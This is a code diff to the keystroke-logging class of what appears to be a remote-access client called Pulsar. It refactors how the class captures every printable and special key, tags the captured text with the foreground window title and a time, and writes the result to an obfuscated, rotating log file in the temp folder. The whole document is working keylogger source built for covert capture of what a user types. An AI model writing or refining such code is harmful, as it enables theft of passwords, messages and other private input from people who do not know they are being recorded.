@@ -27,6 +27,7 @@ namespace Pulsar.Client.Logging
         private bool _isFirstWrite = true;
 
         private readonly HashSet<Keys> _heldModifiers = new HashSet<Keys>();
+        private readonly HashSet<Keys> _processedKeys = new HashSet<Keys>();
 
         public bool IsDisposed { get; private set; }
 
@@ -64,11 +65,9 @@ namespace Pulsar.Client.Logging
             _events.KeyPress -= OnKeyPress;
         }
 
-        // ------------------------------------------------------------
-        // Window change detection + special key handling
-        // ------------------------------------------------------------
         private void OnKeyDown(object sender, KeyEventArgs e)
         {
+            // Track window changes
             string win = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";
 
             lock (_syncLock)
@@ -83,158 +82,148 @@ namespace Pulsar.Client.Logging
                     _lineBuffer.AppendLine($"[{DateTime.Now:HH:mm:ss}] {win}");
                 }
 
-                HandleKeyDownLogic(e);
-            }
-        }
-
-        // ------------------------------------------------------------
-        // Modifier key tracking + special key printing
-        // ------------------------------------------------------------
-        private void HandleKeyDownLogic(KeyEventArgs e)
-        {
-            if (IsModifierKey(e.KeyCode))
-            {
-                _heldModifiers.Add(e.KeyCode);
-                return;
-            }
-
-            string mods = BuildModifierString();
-            string keyText = GetSpecialKeyText(e.KeyCode);
-
-            if (!string.IsNullOrEmpty(keyText))
-            {
-                _lineBuffer.Append(mods + keyText);
-                if (keyText == "[Enter]")
+                // Only process special keys in KeyDown, skip printable characters
+                if (IsModifierKey(e.KeyCode))
                 {
-                    _lineBuffer.AppendLine();
-                    FlushLineBuffer();
+                    _heldModifiers.Add(e.KeyCode);
+                    return;
                 }
-                return;
-            }
 
-            // Default: ignore other non-printable keys
-        }
-
-        // Maps KeyCode to exact [Key] format
-        private string GetSpecialKeyText(Keys key)
-        {
-            switch (key)
-            {
-                case Keys.Enter:
-                    return "[Enter]";
-                case Keys.Back:
-                    return "[Back]";
-                case Keys.Tab:
-                    return "[Tab]";
-                case Keys.Escape:
-                    return "[Esc]";
-                case Keys.Delete:
-                    return "[Del]";
-                case Keys.Up:
-                    return "[Up]";
-                case Keys.Down:
-                    return "[Down]";
-                case Keys.Left:
-                    return "[Left]";
-                case Keys.Right:
-                    return "[Right]";
-                case Keys.F1:
-                    return "[F1]";
-                case Keys.F2:
-                    return "[F2]";
-                case Keys.F3:
-                    return "[F3]";
-                case Keys.F4:
-                    return "[F4]";
-                case Keys.F5:
-                    return "[F5]";
-                case Keys.F6:
-                    return "[F6]";
-                case Keys.F7:
-                    return "[F7]";
-                case Keys.F8:
-                    return "[F8]";
-                case Keys.F9:
-                    return "[F9]";
-                case Keys.F10:
-                    return "[F10]";
-                case Keys.F11:
-                    return "[F11]";
-                case Keys.F12:
-                    return "[F12]";
-                case Keys.F13:
-                    return "[F13]";
-                case Keys.F14:
-                    return "[F14]";
-                case Keys.F15:
-                    return "[F15]";
-                case Keys.F16:
-                    return "[F16]";
-                case Keys.F17:
-                    return "[F17]";
-                case Keys.F18:
-                    return "[F18]";
-                case Keys.F19:
-                    return "[F19]";
-                case Keys.F20:
-                    return "[F20]";
-                case Keys.F21:
-                    return "[F21]";
-                case Keys.F22:
-                    return "[F22]";
-                case Keys.F23:
-                    return "[F23]";
-                case Keys.F24:
-                    return "[F24]";
-                default:
-                    return null;
+                // Mark key as processed to avoid double handling
+                if (!_processedKeys.Contains(e.KeyCode))
+                {
+                    _processedKeys.Add(e.KeyCode);
+                    HandleSpecialKey(e.KeyCode);
+                }
             }
         }
 
-        // ------------------------------------------------------------
-        // Proper backspace: deletes OR logs "[Back]"
-        // ------------------------------------------------------------
-        private void HandleBackspace(string mods)
-        {
-            if (_lineBuffer.Length > 0)
-            {
-                _lineBuffer.Length -= 1;
-            }
-            else
-            {
-                _lineBuffer.Append(mods + "[Back]");
-            }
-        }
-
-        // ------------------------------------------------------------
-        // KeyPress handles printable characters only
-        // ------------------------------------------------------------
         private void OnKeyPress(object sender, KeyPressEventArgs e)
         {
             lock (_syncLock)
             {
-                if (!char.IsControl(e.KeyChar))
-                {
-                    string mods = BuildModifierString();
-                    _lineBuffer.Append(mods + e.KeyChar);
-                }
+                // Only handle printable characters in KeyPress
+                if (char.IsControl(e.KeyChar))
+                    return;
+
+                string mods = BuildModifierString();
+                _lineBuffer.Append(mods + e.KeyChar);
+
+                // Clear modifiers after typing a character
+                _heldModifiers.Clear();
             }
         }
 
         private void OnKeyUp(object sender, KeyEventArgs e)
         {
-            if (_heldModifiers.Contains(e.KeyCode))
+            lock (_syncLock)
+            {
                 _heldModifiers.Remove(e.KeyCode);
+                _processedKeys.Remove(e.KeyCode);
+            }
         }
 
-        // ------------------------------------------------------------
-        // Helper: modifier printing
-        // ------------------------------------------------------------
+        private void HandleSpecialKey(Keys key)
+        {
+            string mods = BuildModifierString();
+            string keyText = GetSpecialKeyText(key);
+
+            if (!string.IsNullOrEmpty(keyText))
+            {
+                _lineBuffer.Append(mods + keyText);
+
+                // Add space after certain special keys for readability
+                if (keyText == "[Enter]")
+                {
+                    _lineBuffer.AppendLine();
+                    FlushLineBuffer();
+                }
+                else if (ShouldAddSpaceAfter(key))
+                {
+                    _lineBuffer.Append(" ");
+                }
+
+                // Clear modifiers after special key
+                _heldModifiers.Clear();
+            }
+        }
+
+        private bool ShouldAddSpaceAfter(Keys key)
+        {
+            switch (key)
+            {
+                case Keys.Tab:
+                case Keys.Escape:
+                case Keys.Up:
+                case Keys.Down:
+                case Keys.Left:
+                case Keys.Right:
+                case Keys.F1:
+                case Keys.F2:
+                case Keys.F3:
+                case Keys.F4:
+                case Keys.F5:
+                case Keys.F6:
+                case Keys.F7:
+                case Keys.F8:
+                case Keys.F9:
+                case Keys.F10:
+                case Keys.F11:
+                case Keys.F12:
+                    return true;
+                default:
+                    return false;
+            }
+        }
+
+        private string GetSpecialKeyText(Keys key)
+        {
+            switch (key)
+            {
+                case Keys.Enter: return "[Enter]";
+                case Keys.Back: return "[Back]";
+                case Keys.Tab: return "[Tab]";
+                case Keys.Escape: return "[Esc]";
+                case Keys.Delete: return "[Del]";
+                case Keys.Up: return "[Up]";
+                case Keys.Down: return "[Down]";
+                case Keys.Left: return "[Left]";
+                case Keys.Right: return "[Right]";
+                case Keys.Space: return " "; // Space as actual space, not [Space]
+                case Keys.F1: return "[F1]";
+                case Keys.F2: return "[F2]";
+                case Keys.F3: return "[F3]";
+                case Keys.F4: return "[F4]";
+                case Keys.F5: return "[F5]";
+                case Keys.F6: return "[F6]";
+                case Keys.F7: return "[F7]";
+                case Keys.F8: return "[F8]";
+                case Keys.F9: return "[F9]";
+                case Keys.F10: return "[F10]";
+                case Keys.F11: return "[F11]";
+                case Keys.F12: return "[F12]";
+                case Keys.F13: return "[F13]";
+                case Keys.F14: return "[F14]";
+                case Keys.F15: return "[F15]";
+                case Keys.F16: return "[F16]";
+                case Keys.F17: return "[F17]";
+                case Keys.F18: return "[F18]";
+                case Keys.F19: return "[F19]";
+                case Keys.F20: return "[F20]";
+                case Keys.F21: return "[F21]";
+                case Keys.F22: return "[F22]";
+                case Keys.F23: return "[F23]";
+                case Keys.F24: return "[F24]";
+                default: return null;
+            }
+        }
+
         private bool IsModifierKey(Keys k)
         {
             return k == Keys.LShiftKey || k == Keys.RShiftKey ||
                    k == Keys.LControlKey || k == Keys.RControlKey ||
-                   k == Keys.LMenu || k == Keys.RMenu;
+                   k == Keys.LMenu || k == Keys.RMenu ||
+                   k == Keys.ShiftKey || k == Keys.ControlKey || k == Keys.Menu;
         }
 
         private string BuildModifierString()
@@ -244,14 +233,21 @@ namespace Pulsar.Client.Logging
 
             StringBuilder sb = new StringBuilder();
             foreach (var m in _heldModifiers)
-                sb.Append($"[{m.ToString().Replace("Key", "")}]");
+            {
+                string modName = m.ToString()
+                    .Replace("L", "")
+                    .Replace("R", "")
+                    .Replace("Key", "")
+                    .Replace("Control", "Ctrl")
+                    .Replace("Menu", "Alt");
+
+                if (!string.IsNullOrEmpty(modName))
+                    sb.Append($"[{modName}]");
+            }
 
             return sb.ToString();
         }
 
-        // ------------------------------------------------------------
-        // Timer flush
-        // ------------------------------------------------------------
         private void TimerElapsed(object sender, ElapsedEventArgs e)
         {
             try { FlushLineBuffer(); } catch { }
@@ -263,25 +259,24 @@ namespace Pulsar.Client.Logging
             {
                 if (_lineBuffer.Length == 0) return;
 
+                // Clean up multiple spaces but preserve intentional ones
                 string content = _lineBuffer.ToString();
                 _lineBuffer.Clear();
 
+                // Replace multiple spaces with single space, but be careful with special keys
                 content = System.Text.RegularExpressions.Regex.Replace(content, @"[ ]{2,}", " ");
 
                 WriteToFile(content);
             }
         }
 
-        // ------------------------------------------------------------
-        // File writing + rotation
-        // ------------------------------------------------------------
         private void WriteToFile(string content)
         {
             if (string.IsNullOrWhiteSpace(content)) return;
 
             try
             {
-                FileHelper.WriteObfuscatedLogFile(_logFilePath, content + Environment.NewLine);
+                FileHelper.WriteObfuscatedLogFile(_logFilePath, content);
 
                 if (new FileInfo(_logFilePath).Length > _maxLogFileSize)
                     RotateLogFile();
@@ -317,9 +312,6 @@ namespace Pulsar.Client.Logging
             return Path.Combine(Path.GetTempPath(), DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
         }
 
-        // ------------------------------------------------------------
-        // Dispose
-        // ------------------------------------------------------------
         public void FlushImmediately() => FlushLineBuffer();
 
         public void Dispose()
